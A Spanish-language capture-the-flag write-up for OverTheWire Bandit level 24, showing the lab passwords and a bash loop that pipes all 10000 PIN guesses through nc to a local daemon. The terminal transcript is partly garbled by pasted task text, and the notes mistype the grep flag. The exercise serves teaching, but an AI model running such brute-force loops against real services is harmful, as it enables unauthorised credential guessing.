# Level 24 al Level 25

## Objetivo 
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## Datos de acceso al nivel
**bandit.labs.overthewire.org**
cuenta
**bandit24**
passw
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Solución 
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connectioWrong! Please enter the correct current password and pincode. Try again.
ns each time

Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 2222
Wrong! Please enter the correct current password and pincode. Try again.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 7777
Wrong! Please enter the correct current password and pincode. Try again.

bandit24@bandit:~$ for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```

## Notas adicionales
grep -V Wrong filtra  todas las lineas que no tenga el mensaje
## Referencias 
